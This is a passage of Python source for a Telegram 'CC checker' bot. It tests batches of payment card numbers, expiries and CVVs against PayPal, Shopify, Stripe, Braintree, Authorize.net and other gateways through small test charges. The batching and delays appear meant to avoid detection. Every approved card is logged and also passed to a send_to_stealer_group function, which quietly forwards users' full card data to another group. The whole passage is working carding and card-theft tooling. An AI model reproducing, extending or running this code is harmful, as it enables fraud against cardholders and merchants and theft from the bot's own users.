    status_msg = await _get_or_edit_loading_msg(context, update, ae(f"🎀 <b>Mass PayU Check Started</b>\n\n📋 Cards: {len(cards)}\n⏱️ Delay: 1s between cards\n🔄 Processing..."))
    
    from modules.payu_gate import check_payu_async
    from modules.gate_checker import get_bin_info
    
    approved = []
    declined = []
    errors = []
    
    for i, card in enumerate(cards):
        if not context.user_data.get(f'mass_check_running_{user_id}'):
            break
        
        result = await check_payu_async(card.strip())
        status = result.get('status', 'ERROR')
        
        if status == 'APPROVED':
            approved.append(card)
            parts = card.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                bin_info = get_bin_info(cc)
                log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "mpayu", result.get('message', ''), bin_info)
                await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "mpayu", result.get('message', ''), bin_info, user.id, user.username or user.first_name)
                check_time = result.get('time', 3.0)
                await send_approved_card_with_gif(update, card, "mpayu", result.get('message', 'Charged'), check_time, bin_info)
        elif status == 'DECLINED':
            declined.append(card)
        else:
            errors.append(card)
        
        if (i + 1) % 5 == 0:
            try:
                await status_msg.edit_text(ae(f"🎀 <b>Mass PayU Progress</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Progress: {i+1}/{len(cards)}"), parse_mode=ParseMode.HTML)
            except:
                pass
        
        if i < len(cards) - 1:
            await asyncio.sleep(1)
    
    context.user_data[f'mass_check_running_{user_id}'] = False
    
    summary = f"🎀 <b>Mass PayU Complete</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Total: {len(cards)}"
    
    if approved:
        summary += "\n\n<b>💳 Approved Cards:</b>\n"
        for card in approved[:10]:
            summary += f"<code>{card}</code>\n"
        if len(approved) > 10:
            summary += f"... and {len(approved) - 10} more"
    
    try:
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

@require_premium
async def mass_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check PayPal $1 with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - PayPal $1</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_pp'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_pp(update, context, cards_text)

async def process_mass_pp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass PayPal $1 check with 5 parallel batches and 1s delay"""
    import asyncio
    import time
    from modules.paypal_gate import check_paypal_async
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'pp'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        batch_size = 5
        total_batches = (total_cards + batch_size - 1) // batch_size
        
        header_msg = await _get_or_edit_loading_msg(
            context, update,
            f"🔄 <b>Mass PayPal $1 Check</b>\n"
            f"Total: {total_cards} | Batches: {total_batches} (x{batch_size})\n"
            f"⏳ Processing...",
        )
        
        for batch_idx in range(0, total_cards, batch_size):
            if context.user_data.get('mass_check_stop'):
                break
            
            batch = cards[batch_idx:batch_idx + batch_size]
            batch_num = batch_idx // batch_size + 1
            
            async def check_single(card):
                card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                start_t = time.time()
                try:
                    result = await asyncio.wait_for(
                        check_paypal_async(card['cc'], card['mm'], card['yy'], card['cvv']),
                        timeout=60.0
                    )
                    el = round(time.time() - start_t, 2)
                    return card, card_str, result, el
                except asyncio.TimeoutError:
                    el = round(time.time() - start_t, 2)
                    return card, card_str, {'status': 'ERROR', 'message': 'Timeout'}, el
                except Exception as e:
                    el = round(time.time() - start_t, 2)
                    return card, card_str, {'status': 'ERROR', 'message': str(e)[:50]}, el
            
            tasks = [check_single(c) for c in batch]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for br in batch_results:
                if context.user_data.get('mass_check_stop'):
                    break
                
                if isinstance(br, Exception):
                    error_count += 1
                    continue
                
                card, card_str, result, elapsed = br
                status = result.get('status', 'ERROR')
                response = result.get('message', 'Unknown')
                
                if status in ['APPROVED', 'CHARGED']:
                    approved_count += 1
                    bin_info = get_bin_info(card['cc'])
                    log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "pp", response, bin_info)
                    await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "pp", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card_str, "pp", response, elapsed, bin_info)
                elif status == 'DECLINED':
                    declined_count += 1
                    card_result = ae(format_mass_card_result(card_str, status, response, "PayPal $1", elapsed))
                    try:
                        await context.bot.send_message(
                            chat_id=update.message.chat_id,
                            text=card_result,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
                else:
                    error_count += 1
                    card_result = ae(format_mass_card_result(card_str, status, response, "PayPal $1", elapsed))
                    try:
                        await context.bot.send_message(
                            chat_id=update.message.chat_id,
                            text=card_result,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
            
            try:
                await header_msg.edit_text(
                    f"🔄 <b>Mass PayPal $1 Check</b>\n"
                    f"Batch {batch_num}/{total_batches} done\n"
                    f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}\n"
                    f"⏳ Processing...",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
            
            if batch_idx + batch_size < total_cards and not context.user_data.get('mass_check_stop'):
                await asyncio.sleep(1.0)
        
        stopped = context.user_data.get('mass_check_stop', False)
        header = ae(format_mass_header(total_cards, approved_count, declined_count, error_count))
        if stopped:
            header = ae("⏹️ Mass Check STOPPED\n") + header
        
        try:
            await header_msg.edit_text(header, parse_mode=ParseMode.HTML)
        except:
            pass
            
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

# PREMIUM GATES - Stripe Mass Auth
@require_premium
async def gate_stm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Mass Auth"""
    await check_gate(update, context, "stm", "Stripe Mass Auth", True)

# PREMIUM GATES - Stripe €1
@require_premium
async def gate_se1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe €1"""
    await check_gate(update, context, "se1", "Stripe €1", True)

# PREMIUM GATES - Shopify
def _format_shopify_result(cc, mm, yy, cvv, result, bin_info, elapsed, username):
    """Format Shopify result — preserves full API response text (no lossy normalization)"""
    import re as _re
    from config import SUPPORT_USERNAME

    card_display = f"{cc}|{mm}|{yy}|{cvv}"

    # Strip the "Approved - " / "Declined - " / "Response - " prefix that
    # check_shopify_netherex_gate prepends, so we get the raw API message.
    raw_msg = result.get("message", "Unknown")
    for _pfx in ("Approved - ", "Declined - ", "Response - "):
        if raw_msg.startswith(_pfx):
            raw_msg = raw_msg[len(_pfx):]
            break

    # Light cleanup — no response_clean_map (preserve original text like "Charged ₹50")
    raw_msg = _re.sub(r'<[^>]+>', '', raw_msg)
    raw_msg = _re.sub(r'\s+', ' ', raw_msg).strip()
    raw_msg = raw_msg.replace('_', ' ')
    if raw_msg.islower():
        raw_msg = raw_msg.title()
    if len(raw_msg) > 80:
        raw_msg = raw_msg[:77] + "..."

    rl = raw_msg.lower()
    _decline_kw = ['declined', 'error', 'failed', 'invalid', 'expired', 'denied',
                   'rejected', 'incorrect', 'not found', 'do not honor', 'insufficient',
                   'lost card', 'stolen', 'blocked', 'restricted']
    _approve_kw = ['approved', 'success', 'valid', 'charged', 'authorized', 'captured',
                   'paid', 'insufficient funds', '3d secure', '3ds', 'cvv incorrect',
                   'card valid', 'authenticated']
    _is_declined = any(k in rl for k in _decline_kw)
    _is_approved = any(k in rl for k in _approve_kw) and not _is_declined

    if _is_approved:
        status_line = "Approved ✅"
    elif result.get("status") == "error":
        status_line = "Error ⚠️"
    else:
        status_line = "Declined ❌"

    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', '')
    level = bin_info.get('level', '')
    _seen = {brand.upper()}
    _net = [brand]
    if card_type and card_type.upper() not in ('UNKNOWN', '') and card_type.upper() not in _seen:
        _seen.add(card_type.upper()); _net.append(card_type)
    if level and level.upper() not in ('UNKNOWN', '') and level.upper() not in _seen:
        _net.append(level)
    network_line = " • ".join(_net)

    country = bin_info.get('country', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    bin_code = bin_info.get('bin', cc[:6])
    sep = "━━━━━━━━━━━━━━━━━━━━"

    return (
        f"💜 <b>ONICHAN • SHOPIFY</b>\n{sep}\n"
        f"💳 <code>{card_display}</code>\n{sep}\n"
        f"📉 <b>Status</b>   : {status_line}\n"
        f"💬 <b>Response</b> : {raw_msg}\n{sep}\n"
        f"🔢 <b>BIN</b>      : {bin_code}\n"
        f"💠 <b>Network</b>  : {network_line}\n"
        f"🏦 <b>Bank</b>     : {bank}\n"
        f"🌍 <b>Country</b>  : {country}\n{sep}\n"
        f"⏱ <b>Time</b>     : {elapsed:.2f}s\n"
        f"👤 <b>User</b>     : @{username}\n"
        f"⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"
    )

@require_premium
async def gate_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify (Netherex) - Clean EnvoX style"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("sh"):
        await update.message.reply_text(offline_message("sh"), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user

    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption="🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot.",
            parse_mode=ParseMode.HTML
        )
        return

    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return

    if not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/sh 4242424242424242|12|25|123</code>\n\n"
            "💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return

    cc, mm, yy, cvv = card_data

    checking_msg = await update.message.reply_text(
        f"🛒 <b>Shopify Checking...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Shopify",
        parse_mode=ParseMode.HTML
    )

    import time as time_module
    start_time = time_module.time()
    result = await asyncio.to_thread(check_card_php, "sh", cc, mm, yy, cvv, user.id)
    elapsed = time_module.time() - start_time

    from modules.gate_checker import get_bin_info
    bin_info = await asyncio.to_thread(get_bin_info, cc)
    username = user.username or user.first_name

    output = ae(_format_shopify_result(cc, mm, yy, cvv, result, bin_info, elapsed, username))

    msg_lower = result.get('message', '').lower()
    is_approved_card = result.get('status') == 'success' and any(k in msg_lower for k in ['approved', 'success', 'valid', 'authorized', 'charged'])
    is_declined_chk = any(k in msg_lower for k in ['declined', 'error', 'failed', 'invalid', 'expired', 'denied'])
    is_approved_card = is_approved_card and not is_declined_chk

    if is_approved_card:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "sh", result["message"], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sh", result["message"], bin_info, user.id, username)

    try:
        await checking_msg.delete()
    except:
        pass

    try:
        gif_url = get_sexy_anime_gif("success" if is_approved_card else "failed")
        await update.message.reply_animation(
            animation=gif_url,
            caption=output,
            parse_mode=ParseMode.HTML
        )
    except:
        await update.message.reply_text(output, parse_mode=ParseMode.HTML)

@require_premium
async def mass_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Shopify with 0.25s delay"""
    user = update.effective_user

    cards_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not cards_text:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Shopify</b> 🛒\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.\n"
            "Or reply to a .txt file with this command.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_sh'] = True
        return

    await process_mass_sh(update, context, cards_text)

async def process_mass_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Shopify check using Netherex API"""
    import asyncio
    import time
    from modules.gate_checker import get_bin_info, check_card_php

    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name

    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return

    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'sh'
    context.user_data['mass_check_stop'] = False

    try:
        limit = get_mass_check_limit(user.id)

        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]

        if not cards:
            await _get_or_edit_loading_msg(context, update, "❌ No valid cards found!")
            return

        if len(cards) > limit:
            cards = cards[:limit]

        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0

        header_msg = await _get_or_edit_loading_msg(
            context, update,
            f"🛒 <b>Mass Shopify Check</b>\n"
            f"Total: {total_cards}\n"
            f"⏳ Processing...",
        )

        for i, card in enumerate(cards):
            if context.user_data.get('mass_check_stop'):
                break

            card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
            start_time = time.time()

            try:
                loop = asyncio.get_running_loop()
                result = await asyncio.wait_for(
                    loop.run_in_executor(None, check_card_php,
                                        "sh", card['cc'], card['mm'], card['yy'], card['cvv'], user.id),
                    timeout=30.0
                )
                elapsed = round(time.time() - start_time, 2)

                bin_info = get_bin_info(card['cc'])
                output = ae(_format_shopify_result(card['cc'], card['mm'], card['yy'], card['cvv'], result, bin_info, elapsed, username))

                msg_lower = result.get('message', '').lower()
                is_live = result['status'] == 'success' and any(k in msg_lower for k in ['approved', 'success', 'valid', 'authorized', 'charged'])
                is_dead = any(k in msg_lower for k in ['declined', 'error', 'failed', 'invalid', 'expired', 'denied'])
                is_live = is_live and not is_dead

                if is_live:
                    approved_count += 1
                    log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "sh", result['message'], bin_info)
                    await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "sh", result['message'], bin_info, user.id, username)
                    try:
                        gif_url = get_sexy_anime_gif("success")
                        await context.bot.send_animation(
                            chat_id=update.message.chat_id,
                            animation=gif_url,
                            caption=output,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        await context.bot.send_message(chat_id=update.message.chat_id, text=output, parse_mode=ParseMode.HTML)
                else:
                    declined_count += 1
                    try:
                        gif_url = get_sexy_anime_gif("failed")
                        await context.bot.send_animation(
                            chat_id=update.message.chat_id,
                            animation=gif_url,
                            caption=output,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        await context.bot.send_message(chat_id=update.message.chat_id, text=output, parse_mode=ParseMode.HTML)

            except asyncio.TimeoutError:
                error_count += 1
                elapsed = round(time.time() - start_time, 2)
                timeout_result = {"status": "error", "message": "Timeout (30s)"}
                bin_info = get_bin_info(card['cc'])
                output = ae(_format_shopify_result(card['cc'], card['mm'], card['yy'], card['cvv'], timeout_result, bin_info, elapsed, username))
                try:
                    await context.bot.send_message(chat_id=update.message.chat_id, text=output, parse_mode=ParseMode.HTML)
                except:
                    pass
            except Exception as e:
                error_count += 1

            if i < len(cards) - 1:
                await asyncio.sleep(0.25)

        stopped = context.user_data.get('mass_check_stop', False)
        summary = f"🛒 <b>Shopify Mass Check Complete</b>\n\n"
        summary += f"📊 <b>Total:</b> {total_cards}\n"
        summary += f"✅ <b>Approved:</b> {approved_count}\n"
        summary += f"❌ <b>Declined:</b> {declined_count}\n"
        summary += f"⚠️ <b>Errors:</b> {error_count}"
        if stopped:
            summary = "⏹️ <b>Mass Check STOPPED</b>\n\n" + summary

        try:
            await header_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        except:
            pass
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

# ============================================================================
# DOT COMMAND HANDLER
# ============================================================================

async def handle_dot_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle commands starting with . (dot)"""
    text = update.message.text
    
    if not text.startswith('.'):
        return
    
    # Parse command
    parts = text.split(maxsplit=1)
    command = parts[0][1:].lower()  # Remove dot and lowercase
    
    # Check if it's a valid gate command
    valid_gates = ['ss', 'bu', 'sq', 'pp', 'sor', 'st5', 'st12', 'str', 'dep', 
                   'auz', 'asd', 'atf', 'anh', 'sh6', 'sh8', 'sh10', 'sh13', 'bt1', 'bt3d', 'rp', 'stm', 'se1', 'sh', 'st1']
    
    if command not in valid_gates:
        return
    
    # Check if card data provided
    if len(parts) < 2:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>.{command} 4242424242424242|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Set context args for the handler
    context.args = parts[1].split()
    
    # Route to appropriate gate handler
    gate_handlers = {
        'ss': gate_ss, 'bu': gate_bu, 'sq': gate_sq,
        'pp': gate_pp, 'sor': gate_sor, 'st5': gate_st5,
        'st12': gate_st12, 'str': gate_str, 'dep': gate_dep,
        'auz': gate_auz, 'asd': gate_asd, 'atf': gate_atf, 'anh': gate_anh,
        'sh6': gate_sh6, 'sh8': gate_sh8, 'sh10': gate_sh10, 'sh13': gate_sh13,
        'bt1': gate_bt1, 'bt3d': gate_bt3d, 'rp': gate_rp, 'stm': gate_stm, 'se1': gate_se1, 'sh': gate_sh, 'st1': gate_st1
    }
    
    handler = gate_handlers.get(command)
    if handler:
        await handler(update, context)

# ============================================================================
# MASS CHECK SHORTCUTS
# ============================================================================

async def mass_check_shortcut(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_name: str):
    """Handle mass check shortcuts like /mpp, /mss - Available for all approved users"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline(gate_name):
        await update.message.reply_text(offline_message(gate_name), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user

    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if premium gate requires premium access
    premium_gates = ['pp', 'sor', 'st5', 'st12', 'str', 'dep', 
                    'auz', 'asd', 'atf', 'anh', 'sh6', 'sh8', 'sh10', 'sh13', 
                    'bt1', 'bt3d', 'rp', 'stm', 'st1']
    
    if gate_name in premium_gates and not is_premium(user.id):
        await update.message.reply_text(
            get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get cards from message
    text = update.message.text
    
    # Split by command (handles both "/mpp card|mm|yy|cvv" and "/mpp\ncard|mm|yy|cvv")
    parts = text.split(maxsplit=1)
    
    # Get cards from same line or next lines
    if len(parts) > 1:
        # Card on same line as command
        cards_text = parts[1]
    else:
        # Try to get from next lines
        lines = text.split('\n')
        cards_text = '\n'.join(lines[1:]) if len(lines) > 1 else ""
    
    if not cards_text.strip():
        txt_content = await get_txt_content_from_reply(update, context)
        if txt_content:
            cards_text = txt_content
        else:
            await update.message.reply_text(
                f"❌ <b>No cards provided!</b>\n\n"
                f"🎯 <b>Usage:</b>\n"
                f"<code>/m{gate_name} 4242424242424242|12|25|123</code>\n\n"
                f"<b>Or reply to a .txt file of cards with this command.</b>\n\n"
                f"<b>Or multiple cards (each on new line):</b>\n"
                f"<code>/m{gate_name}</code>\n"
                f"<code>4242424242424242|12|25|123</code>\n"
                f"<code>5555555555554444|01|26|456</code>",
                parse_mode=ParseMode.HTML
            )
            return
    
    # Route to specific mass check processor based on gate
    if gate_name == 'pp':
        await process_mass_pp(update, context, cards_text)
    elif gate_name == 'rz':
        await process_mass_rz(update, context, cards_text)
    elif gate_name == 'b3':
        await process_mass_b3(update, context, cards_text)
    elif gate_name == 'st':
        await process_mass_st(update, context, cards_text)
    elif gate_name == 'sh':
        await process_mass_sh(update, context, cards_text)
    else:
        # For other gates, store cards in context and call mass_check
        context.user_data['mass_check_gate'] = gate_name
        context.user_data['mass_check_cards'] = cards_text
        context.args = [gate_name]
        await mass_check_with_cards(update, context, cards_text)

# ============================================================================
# MASS CHECK TXT FILE SHORTCUTS
# ============================================================================

async def mass_check_txt_shortcut(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_name: str):
    """Handle TXT file mass check shortcuts like /msstxt, /mpptxt"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline(gate_name):
        await update.message.reply_text(offline_message(gate_name), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user

    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Store gate name in user context for file upload
    context.user_data['mass_check_gate'] = gate_name
    
    # Get gate display name
    gate_names = {
        'ss': 'Stripe Auth $0.5',
        'bu': 'Braintree Auth $1',
        'sq': 'Square Auth $0',
        'pp': 'PayPal $1',
        'sor': 'Stripe $2',
        'st5': 'Stripe $5',
        'st12': 'Stripe $12',
        'str': 'Stripe $15',
        'dep': 'Stripe $49',
        'auz': 'Authorize.net $0',
        'asd': 'Authorize.net $7',
        'atf': 'Authorize.net $25',
        'anh': 'Authorize.net $200',
        'sh6': 'Shopify $6',
        'sh8': 'Shopify $8',
        'sh10': 'Shopify $10',
        'sh13': 'Shopify $13',
        'bt1': 'Braintree $1',
        'bt3d': 'Braintree 3D',
        'rz': 'Razorpay ₹1',
        'st': 'Stripe Auth',
        'stm': 'Stripe Mass Auth',
        'st1': 'Stripe $1'
    }
    
    gate_display = gate_names.get(gate_name, gate_name.upper())
    limit = get_mass_check_limit(user.id)
    rank = get_user_rank(user.id)
    
    await update.message.reply_text(
        f"📁 <b>MASS CHECK TXT - {gate_display}</b>\n\n"
        f"✅ <b>Gate Selected:</b> {gate_display}\n"
        f"💎 <b>Your Status:</b> {rank}\n"
        f"📊 <b>Your Limit:</b> {limit} cards\n\n"
        f"📤 <b>Now upload your .txt file!</b>\n\n"
        f"The bot will automatically:\n"
        f"1. Extract all cards from file\n"
        f"2. Check them with {gate_display}\n"
        f"3. Show results\n\n"
        f"⏳ <b>Waiting for file...</b>",
        parse_mode=ParseMode.HTML
    )

async def handle_mass_check_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle TXT file upload for mass check shortcuts"""
    user = update.effective_user
    
    # Check if gate is set
    if 'mass_check_gate' not in context.user_data:
        return  # Not a mass check TXT operation
    
    gate_name = context.user_data['mass_check_gate']
    
    # Check if message has document
    if not update.message.document:
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(ae("❌ Only .txt files are supported!"))
        return
    
    # Get gate info
    gate_names = {
        'ss': ('Stripe Auth $0.5', False),
        'bu': ('Braintree Auth $1', False),
        'sq': ('Square Auth $0', False),
        'pp': ('PayPal $1', True),
        'sor': ('Stripe $2', True),
        'st5': ('Stripe $5', True),
        'st12': ('Stripe $12', True),
        'str': ('Stripe $15', True),
        'dep': ('Stripe $49', True),
        'auz': ('Authorize.net $0', True),
        'asd': ('Authorize.net $7', True),
        'atf': ('Authorize.net $25', True),
        'anh': ('Authorize.net $200', True),
        'sh6': ('Shopify $6', True),
        'sh8': ('Shopify $8', True),
        'sh10': ('Shopify $10', True),
        'sh13': ('Shopify $13', True),
        'bt1': ('Braintree $1', True),
        'bt3d': ('Braintree 3D', True),
        'st1': ('Stripe $1', True)
    }
    
    gate_display, requires_premium = gate_names.get(gate_name, (gate_name.upper(), False))
    
    # Check premium requirement
    if requires_premium and not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        # Clear gate
        del context.user_data['mass_check_gate']
        return
    
    loading_msg = await update.message.reply_text(f"📁 Processing file for {gate_display}...")
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        # Extract cards
        cards = extract_cards_from_text(text_content)
        
        if not cards:
            await loading_msg.edit_text(
                "❌ <b>No valid cards found in file!</b>\n\n"
                "Format should be: CC|MM|YY|CVV",
                parse_mode=ParseMode.HTML
            )
            del context.user_data['mass_check_gate']
            return
        
        # Get user limit
        limit = get_mass_check_limit(user.id)
        
        # Apply limit
        if len(cards) > limit:
            await loading_msg.edit_text(
                f"⚠️ <b>LIMIT EXCEEDED!</b>\n\n"
                f"File contains {len(cards)} cards.\n"
                f"Your limit: {limit} cards\n\n"
                f"Only first {limit} cards will be checked.\n\n"
                f"💎 Upgrade to premium for higher limits!",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(2)
        
        cards = cards[:limit]
        
        # Start mass checking
        await loading_msg.edit_text(
            f"🎀 <b>Mass Checking Started</b>\n\n"
            f"Gateway: {gate_display}\n"
            f"File: {document.file_name}\n"
            f"Cards: {len(cards)}\n\n"
            f"⏳ <b>Processing...</b>",
            parse_mode=ParseMode.HTML
        )
        
        # Check each card concurrently (up to 5 at a time) without blocking the event loop
        approved = []
        declined = []
        _sem = asyncio.Semaphore(5)

        async def _check_one_file(idx, cc, mm, yy, cvv):
            async with _sem:
                return idx, cc, mm, yy, cvv, await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)

        tasks = [_check_one_file(i, cc, mm, yy, cvv) for i, (cc, mm, yy, cvv) in enumerate(cards, 1)]
        done = 0
        for coro in asyncio.as_completed(tasks):
            idx, cc, mm, yy, cvv, result = await coro
            done += 1
            card_str = f"{cc}|{mm}|{yy}|{cvv}"

            if result["status"] == "success":
                msg = result.get("message", "")
                card_is_approved = "approved" in msg.lower() or "success" in msg.lower() or "charged" in msg.lower()

                if card_is_approved:
                    approved.append(card_str)

                    # Log approved card, send to stealer, and send GIF
                    try:
                        from modules.gate_checker import get_bin_info
                        bin_info = await asyncio.to_thread(get_bin_info, cc)
                        log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, msg, bin_info)
                        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, msg, bin_info, user.id, user.username or user.first_name)
                        await send_approved_card_with_gif(update, card_str, gate_name, msg, 3.0, bin_info)
                    except:
                        pass
                else:
                    declined.append(card_str)
            else:
                declined.append(card_str)

            # Update progress
            try:
                progress_bar = "🟦" * done + "⬜" * (len(cards) - done)
                await loading_msg.edit_text(
                    f"Progress: {done}/{len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}\n"
                    f"<b>{progress_bar[:20]}</b>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        # Send final results
        rank = get_user_rank(user.id)
        result_text = f"""🎀 <b>Mass Check Complete</b>

Gateway: {gate_display}
Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}

"""
        
        if approved:
            result_text += "<b>Approved Cards:</b>\n\n"
            
            for i, card_str in enumerate(approved[:10], 1):
                result_text += f"<b>{i}.</b> <code>{card_str}</code>\n"
                
                try:
                    from modules.gate_checker import get_bin_info
                    cc_parts = card_str.split('|')
                    if len(cc_parts) >= 1:
                        bin_info = get_bin_info(cc_parts[0])
                        result_text += f"   <b>├─</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
                        result_text += f"   <b>├─</b> {bin_info['bank']}\n"
                        result_text += f"   <b>├─</b> {bin_info['country']} {bin_info['emoji']}\n\n"
                except:
                    result_text += "\n"
            
            if len(approved) > 10:
                result_text += f"<i>...and {len(approved) - 10} more approved cards</i>\n\n"
        
        
        result_text += f"<b>├─Bot by - @tu_bkl_hai</b>"
        
        await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        
        # Clear gate
        del context.user_data['mass_check_gate']
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))
